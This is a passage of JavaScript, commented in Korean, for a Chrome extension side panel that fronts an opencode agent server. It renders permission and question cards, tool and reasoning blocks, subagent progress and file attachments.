    mk(t('항상 허용'), 'always', '', part.always?.length ? part.always.join('\n') : '');
    mk(t('거부'), 'reject', 'danger');
    el.appendChild(buttons);
    el.appendChild(el._status);
    return el;
  }

  function buildQuestionCard(part) {
    const el = interactionCardShell(t('에이전트의 질문'), part.fromSubagent ? t('하위 에이전트의 요청입니다.') : '');
    const readers = []; // 질문별 선택값을 읽는 함수
    (part.questions || []).forEach((q, qi) => {
      const box = document.createElement('div');
      box.className = 'interaction-question';
      const qt = document.createElement('div');
      qt.className = 'interaction-q-text';
      qt.textContent = q.header ? `${q.header} — ${q.question || ''}` : (q.question || '');
      box.appendChild(qt);
      const name = `q-${part.id}-${qi}`;
      const inputs = [];
      for (const opt of (q.options || [])) {
        const label = document.createElement('label');
        label.className = 'interaction-option';
        const input = document.createElement('input');
        input.type = q.multiple ? 'checkbox' : 'radio';
        input.name = name;
        input.value = opt.label;
        label.appendChild(input);
        const span = document.createElement('span');
        span.textContent = opt.description ? `${opt.label} — ${opt.description}` : opt.label;
        label.appendChild(span);
        box.appendChild(label);
        inputs.push(input);
      }
      let custom = null;
      if (q.custom !== false) {
        custom = document.createElement('input');
        custom.type = 'text';
        custom.className = 'interaction-custom';
        custom.placeholder = t('직접 입력 (선택)');
        box.appendChild(custom);
      }
      readers.push(() => {
        const picked = inputs.filter(i => i.checked).map(i => i.value);
        const typed = custom?.value.trim();
        if (typed) picked.push(typed);
        return picked;
      });
      el.appendChild(box);
    });
    const buttons = document.createElement('div');
    buttons.className = 'interaction-buttons';
    const send = document.createElement('button');
    send.className = 'mcp-action-btn primary';
    send.textContent = t('답변 보내기');
    send.addEventListener('click', () => {
      const answers = readers.map(r => r());
      if (answers.some(a => a.length === 0)) {
        setInteractionStatus(el, t('모든 질문에 답해 주세요.'), 'error');
        return;
      }
      sendInteraction(el, 'reply-question', { requestId: part.id, answers });
    });
    const skip = document.createElement('button');
    skip.className = 'mcp-action-btn danger';
    skip.textContent = t('건너뛰기');
    skip.addEventListener('click', () => sendInteraction(el, 'reject-question', { requestId: part.id }));
    buttons.appendChild(send);
    buttons.appendChild(skip);
    el.appendChild(buttons);
    el.appendChild(el._status);
    return el;
  }

  async function restorePendingInteractions(sessionId) {
    try {
      const res = await sendMessageToBackground('get-pending-interactions', { sessionId });
      if (sessionId !== currentSessionId) return;
      for (const part of res.items || []) handleInteractionPart(part);
    } catch (e) {
      console.warn('대기 중인 권한/질문 요청 복원 실패:', e.message);
    }
  }

  function markInteractionResolved(id, reply) {
    const entry = interactionCards.get(id);
    if (!entry || entry.resolved) return;
    entry.resolved = true;
    disableInteraction(entry.el);
    entry.el.classList.add('resolved');
    const text = reply === 'reject' ? t('거부됨') : reply === 'always' ? t('항상 허용됨') : reply === 'once' ? t('허용됨') : t('응답 완료');
    setInteractionStatus(entry.el, text, reply === 'reject' ? 'error' : 'ok');
  }

  // 응답이 끝나면(완료·오류·중단) 남은 카드는 더 이상 유효하지 않다.
  function expirePendingInteractions() {
    for (const [id, entry] of interactionCards) {
      if (!entry.resolved) {
        entry.resolved = true;
        disableInteraction(entry.el);
        entry.el.classList.add('resolved');
        setInteractionStatus(entry.el, t('요청이 만료되었습니다.'));
      }
      interactionCards.delete(id);
    }
  }

  function ensureActiveBlockMessage() {
    // 탭 전환/세션 초기화 등으로 messagesContainer가 통째로 비워지는 지점이 여러 곳
    // (reinitForTab, /clear, loadAndRenderHistory 등) 있어 매번 거기서 참조를 리셋하는
    // 대신, 여기서 DOM에 실제로 붙어있는지 확인해 끊긴 참조를 스스로 치유한다.
    if (activeBlocks && activeBlocksContainer && document.body.contains(activeBlocksContainer)) return;

    const typingIndicator = document.getElementById('typing-indicator');
    let messageDiv;
    if (typingIndicator) {
      messageDiv = typingIndicator;
      messageDiv.removeAttribute('id');
      messageDiv.classList.remove('typing-indicator');
      const oldContent = messageDiv.querySelector('.message-content');
      if (oldContent) oldContent.remove();
    } else {
      messageDiv = document.createElement('div');
      messageDiv.className = 'message bot-message';
      const avatar = document.createElement('div');
      avatar.className = 'message-avatar';
      avatar.textContent = '🤖';
      messageDiv.appendChild(avatar);
      messagesContainer.appendChild(messageDiv);
    }

    const blocksContainer = document.createElement('div');
    blocksContainer.className = 'message-blocks';
    messageDiv.appendChild(blocksContainer);

    activeBlocks = createBlocks();
    activeBlocksContainer = blocksContainer;
  }

  const TOOL_STATUS_LABEL = {
    get pending() { return t('대기 중'); },
    get running() { return t('실행 중…'); },
    get completed() { return t('완료'); },
    get error() { return t('오류'); },
    get cancelled() { return t('취소됨'); },
    get interrupted() { return t('중단됨'); }
  };

  function toolStatusLabel(status) {
    return TOOL_STATUS_LABEL[status] || status || '';
  }

  function toolTarget(part) {
    if (part.title) return part.title;
    const input = part.input;
    if (input && typeof input === 'object') {
      if (input.command) return input.command;
      if (input.path) return input.path;
      if (input.filePath) return input.filePath;
    }
    return part.tool || '';
  }

  function makeCollapsible(el, headerSelector) {
    el.querySelector(headerSelector).addEventListener('click', () => {
      el.classList.toggle('collapsed');
    });
  }

  function createBlockElement(block) {
    if (block.type === 'text') {
      const el = document.createElement('div');
      el.className = 'text-block markdown-body';
      el.dataset.blockType = 'text';
      updateBlockElement(el, block);
      return el;
    }
    if (block.type === 'tool') {
      const el = document.createElement('div');
      el.className = 'tool-card collapsed';
      el.dataset.blockType = 'tool';
      el.innerHTML = `
        <div class="tool-card-header">
          <span class="tool-icon" aria-hidden="true"></span>
          <span class="tool-name"></span>
          <span class="tool-target"></span>
          <span class="tool-status"></span>
        </div>
        <div class="tool-subagent hidden">
          <span class="tool-subagent-text"></span>
          <span class="tool-subagent-elapsed"></span>
        </div>
        <div class="tool-card-body"></div>
      `;
      makeCollapsible(el, '.tool-card-header');
      updateBlockElement(el, block);
      return el;
    }
    // reasoning
    const el = document.createElement('div');
    el.className = 'reasoning-block collapsed';
    el.dataset.blockType = 'reasoning';
    el.innerHTML = `
      <div class="reasoning-block-header">${t('생각 중')}</div>
      <div class="reasoning-block-body"></div>
    `;
    makeCollapsible(el, '.reasoning-block-header');
    updateBlockElement(el, block);
    return el;
  }

  // tool/reasoning 콘텐츠는 항상 textContent로만 삽입한다(서버가 준 파일/명령
  // 출력이 신뢰 경계 밖 데이터일 수 있으므로 HTML 파싱 자체를 하지 않음 — §6 XSS).
  function updateBlockElement(el, block) {
    if (block.type === 'text') {
      if (el.dataset.raw === block.raw) return; // 원문 불변 시 재파싱 생략 (O(n^2) 방지)
      el.dataset.raw = block.raw;
      el.innerHTML = renderMarkdown(block.raw);
      return;
    }
    if (block.type === 'tool') {
      el.dataset.status = block.status || '';
      el.querySelector('.tool-name').textContent = block.tool || 'tool';
      el.querySelector('.tool-target').textContent = toolTarget(block);
      el.querySelector('.tool-status').textContent = toolStatusLabel(block.status);
      const bodyParts = [];
      if (block.input !== undefined) {
        bodyParts.push(`${t('입력:\n')}${typeof block.input === 'string' ? block.input : JSON.stringify(block.input, null, 2)}`);
      }
      if (block.output) {
        bodyParts.push(`${t('결과:\n')}${typeof block.output === 'string' ? block.output : JSON.stringify(block.output, null, 2)}`);
      }
      el.querySelector('.tool-card-body').textContent = bodyParts.join('\n\n').slice(0, 2000);
      updateSubagentLine(el, block);
      return;
    }
    // reasoning
    el.querySelector('.reasoning-block-body').textContent = block.text;
  }

  // task 카드의 하위 에이전트 진행 줄: "explore · bash 실행 중 · 12단계 · 3:42"
  // 하위 에이전트는 수 분간 일할 수 있는데, 이 줄이 없으면 카드가 "실행 중…"으로만 남아 멈춘 것처럼 보인다.
  function subagentActivityLabel(activity) {
    if (!activity) return '';
    if (activity.type === 'tool') return t('{tool} 실행 중', { tool: activity.tool });
    if (activity.type === 'writing') return t('응답 작성 중');
    return t('생각 중');
  }

  function formatElapsed(ms) {
    const sec = Math.max(0, Math.floor(ms / 1000));
    return `${Math.floor(sec / 60)}:${String(sec % 60).padStart(2, '0')}`;
  }

  function updateSubagentLine(el, block) {
    const line = el.querySelector('.tool-subagent');
    const sub = block.subagent;
    if (!sub) { line.classList.add('hidden'); return; }
    line.classList.remove('hidden');
    const running = block.status === 'running' || block.status === 'pending';
    const parts = [sub.agent || t('하위 에이전트')];
    if (running && sub.activity) parts.push(subagentActivityLabel(sub.activity));
    if (sub.steps) parts.push(t('{n}단계', { n: sub.steps }));
    el.querySelector('.tool-subagent-text').textContent = parts.join(' · ');
    const elapsed = el.querySelector('.tool-subagent-elapsed');
    elapsed.dataset.started = String(sub.startedAt || Date.now());
    // 끝난 카드는 경과 시간을 멈춘다(끝난 시점을 한 번만 기록)
    if (!running && !elapsed.dataset.ended) elapsed.dataset.ended = String(Date.now());
    if (running) delete elapsed.dataset.ended;
    tickSubagentElapsed(elapsed);
  }

  function tickSubagentElapsed(elapsed) {
    const end = Number(elapsed.dataset.ended) || Date.now();
    elapsed.textContent = formatElapsed(end - Number(elapsed.dataset.started));
  }

  // 진행 중인 카드의 경과 시간만 1초마다 갱신한다(하위 에이전트가 긴 bash를 돌리면 이벤트가 한동안 없다)
  setInterval(() => {
    document.querySelectorAll('.tool-subagent:not(.hidden) .tool-subagent-elapsed:not([data-ended])').forEach(tickSubagentElapsed);
  }, 1000);

  function renderBlocks(blocks, container) {
    blocks.forEach((block, i) => {
      const existing = container.children[i];
      if (!existing || existing.dataset.blockType !== block.type) {
        const el = createBlockElement(block);
        if (existing) container.replaceChild(el, existing);
        else container.appendChild(el);
      } else {
        updateBlockElement(existing, block);
      }
    });
    while (container.children.length > blocks.length) {
      container.removeChild(container.lastChild);
    }
  }

  // 코드 블록 강조/복사 버튼은 스트리밍 중이 아니라 메시지가 확정된 시점에만
  // 주입한다 — 스트리밍 중에는 renderBlocks()가 매 프레임 innerHTML을 다시 쓰므로
  // 여기서 넣은 DOM이 계속 사라졌다 다시 생기게 된다 (copy_markdown_enhancement_plan.md §3).
  function enhanceCodeBlocks(container) {
    if (!container) return;
    container.querySelectorAll('pre').forEach((pre) => {
      if (pre.dataset.enhanced === '1') return; // idempotent: 같은 <pre>에 중복 주입 방지
      const codeEl = pre.querySelector('code');
      if (!codeEl) return;

      const lang = extractLangFromClassName(codeEl.className);

      if (typeof hljs !== 'undefined') {
        try { hljs.highlightElement(codeEl); } catch { /* 미지원 언어 등은 무강조로 방치 */ }
      }

      const header = document.createElement('div');
      header.className = 'code-block-header';

      const langLabel = document.createElement('span');
      langLabel.className = 'code-block-lang';
      langLabel.textContent = lang || 'text';

      const copyBtn = document.createElement('button');
      copyBtn.type = 'button';
      copyBtn.className = 'code-block-copy';
      copyBtn.textContent = t('복사');
      copyBtn.addEventListener('click', async () => {
        try {
          await navigator.clipboard.writeText(codeEl.textContent);
          copyBtn.textContent = t('✓ 복사됨');
        } catch {
          copyBtn.textContent = t('복사 실패');
        } finally {
          setTimeout(() => { copyBtn.textContent = t('복사'); }, 1500);
        }
      });

      header.appendChild(langLabel);
      header.appendChild(copyBtn);
      pre.insertBefore(header, pre.firstChild);
      pre.dataset.enhanced = '1';
    });
  }

  sendBtn.addEventListener('click', () => {
    if (isLoading) cancelMessage();
    else sendMessage();
  });

  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'message-chunk' && message.sessionId === currentSessionId) {
      ensureActiveBlockMessage();
      appendTextDelta(activeBlocks, message.chunk);
      blockRenderScheduler.request();
      noteProgress('writing');
    } else if (message.action === 'message-part' && message.sessionId === currentSessionId
               && ['permission', 'question', 'interaction-resolved'].includes(message.part?.kind)) {
      handleInteractionPart(message.part);
      noteProgress(message.part.kind === 'interaction-resolved' ? 'waiting' : 'asking');
    } else if (message.action === 'message-part' && message.sessionId === currentSessionId
               && ['retry', 'retry-cleared'].includes(message.part?.kind)) {
      if (message.part.kind === 'retry' && isLoading) showRetryStatus(message.part);
      else clearRetryStatus();
      noteProgress(null);
    } else if (message.action === 'message-part' && message.sessionId === currentSessionId
               && message.part?.kind === 'heartbeat') {
      noteServerCheck(message.part.state);
    } else if (message.action === 'message-part' && message.sessionId === currentSessionId
               && message.part?.kind === 'turn-start') {
      if (isLoading) handleTurnStart(message.part);
    } else if (message.action === 'message-part' && message.sessionId === currentSessionId) {
      ensureActiveBlockMessage();
      const part = message.part || {};
      if (part.kind === 'tool') {
        upsertToolPart(activeBlocks, part);
        const active = part.status === 'pending' || part.status === 'running';
        noteProgress(active ? 'tool' : 'waiting', active ? (part.tool || '') : '');
      } else if (part.kind === 'reasoning-start') {
        upsertReasoningStart(activeBlocks, part.id);
        noteProgress('thinking');
      } else if (part.kind === 'reasoning-delta') {
        appendReasoningDelta(activeBlocks, part.id, part.delta);
        noteProgress('thinking');
      } else if (part.kind === 'subagent') {
        setSubagentProgress(activeBlocks, part);
        noteProgress(part.activity ? 'subagent' : null, part.agent || '');
      }
      blockRenderScheduler.request();
    } else if (message.action === 'server-runtime-updated') {
      setRuntimeBadge(message.runtime);
    } else if (message.action === 'server-restart-state' && !restartBusy) {
      // 다른 창의 사이드패널이 하드 재시작을 시작했다. 이 패널도 입력을 막고 결과에 맞춰 복귀한다.
      // (재시작을 직접 시작한 패널은 runServerRestart가 처리한다)
      if (message.restarting) {
        if (isLoading) cancelMessage().catch(() => {});
        updateConnectionStatus('restarting');
      } else if (connectionStatus === 'restarting') {
        if (message.success) {
          updateConnectionStatus('connected');
          refreshRuntimeBadge();
          refreshServerCatalogs().catch(() => {});
        } else {
          updateConnectionStatus('disconnected');
        }
      }
    } else if (message.action === 'default-directory-updated' && !currentWorkingDir) {
      defaultWorkingDir = message.directory;
      updateWorkingFolderDisplay(message.directory, true);
    } else if (message.action === 'message-complete' && message.sessionId === currentSessionId) {
      if (message.newSessionId) {
        currentSessionId = message.newSessionId;
      }
      setLoadingState(false);
      blockRenderScheduler.flush(); // pending 프레임을 즉시 반영해 마지막 delta 누락 방지
      expirePendingInteractions();

      if (message.error) {
        // 진행 중이던 tool/reasoning 카드를 지우지 않고 'error'로 고정해 남긴다
        // (§6: 실패 시에도 "무엇을 하고 있었는지"는 보여야 함).
        if (activeBlocks) {
          finalizeRunning(activeBlocks, 'error');
          renderBlocks(activeBlocks, activeBlocksContainer);
          enhanceCodeBlocks(activeBlocksContainer); // 에러로 끊겨도 완성된 코드 블록은 강조/복사 가능하게
        } else {
          removeTypingIndicator();
        }
        addErrorMessage(t(message.error));
      } else if (activeBlocks) {
        // SSE가 idle까지 갔는데 텍스트 delta가 하나도 안 쌓인 경우(§6 REST 폴백,
        // background.js의 fetchFallbackContent) message.content로 복구된 텍스트를
        // 블록에 반영하지 않으면 tool 카드만 보이고 실제 답변이 사라진다.
        const hasText = activeBlocks.some((b) => b.type === 'text' && b.raw.trim());
        if (!hasText && message.content && message.content.trim()) {
          appendTextDelta(activeBlocks, message.content.trim());
        }
        // running/pending으로 남은 파트가 있으면(타임아웃 등) 무한 스피너로
        // 남지 않도록 강제 정리 (§6).
        finalizeRunning(activeBlocks, 'interrupted');
        renderBlocks(activeBlocks, activeBlocksContainer);
        enhanceCodeBlocks(activeBlocksContainer);
      } else if (message.content && message.content.trim()) {
        addBotMessage(message.content.trim());
      } else {
        removeTypingIndicator();
      }
      activeBlocks = null;
      activeBlocksContainer = null;
      settleQueue({ recovered: !!message.recovered });
      flushLocalQueue();
    }
  });

  function showToast(message) {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.classList.add('show');
    clearTimeout(toast._hideTimer);
    toast._hideTimer = setTimeout(() => toast.classList.remove('show'), 2500);
  }

  function renderAttachments() {
    attachmentsBar.innerHTML = '';
    if (attachedFiles.length === 0) {
      attachmentsBar.classList.add('hidden');
      updateSendButtonState();
      return;
    }
    attachmentsBar.classList.remove('hidden');
    attachedFiles.forEach((filePath) => {
      const chip = document.createElement('div');
      chip.className = 'attachment-chip';
      chip.title = filePath;

      const name = document.createElement('span');
      name.className = 'attachment-chip-name';
      name.textContent = (filePath.replace(/\\/g, '/').split('/').pop() || filePath);

      const removeBtn = document.createElement('button');
      removeBtn.className = 'attachment-chip-remove';
      removeBtn.title = t('제거');
      removeBtn.textContent = '✕';
      removeBtn.addEventListener('click', () => {
        attachedFiles = attachedFiles.filter((f) => f !== filePath);
        renderAttachments();
      });

      chip.appendChild(name);
      chip.appendChild(removeBtn);
      attachmentsBar.appendChild(chip);
    });
    updateSendButtonState();
  }

  // 백슬래시/슬래시 표기 차이만 흡수한다. opencode 서버가 WSL(대소문자 구분 파일시스템)일
  // 수 있으므로 대소문자는 그대로 비교해야 서로 다른 파일을 같은 것으로 오인하지 않는다.
  function normalizePathForDedup(p) {
    return p.replace(/\\/g, '/');
  }

  function addAttachedFiles(paths) {
    for (const raw of paths) {
      const trimmed = (raw || '').trim();
      if (!trimmed) continue;
      const key = normalizePathForDedup(trimmed);
      if (!attachedFiles.some((f) => normalizePathForDedup(f) === key)) {
        attachedFiles.push(trimmed);
      }
    }
    renderAttachments();
  }

  attachBtn.addEventListener('click', async () => {
    try {
      const res = await sendMessageToBackground('browse-for-file');
      const files = res?.files || [];
      if (files.length > 0) addAttachedFiles(files);
      (res?.warnings || []).forEach((w) => showToast(w));
    } catch (e) {
      const input = window.prompt(t('첨부할 파일의 절대 경로를 입력하세요 (여러 개는 쉼표로 구분):'));
      if (input) addAttachedFiles(input.split(','));
    }
  });

  updateAgentBar();
  init();
});
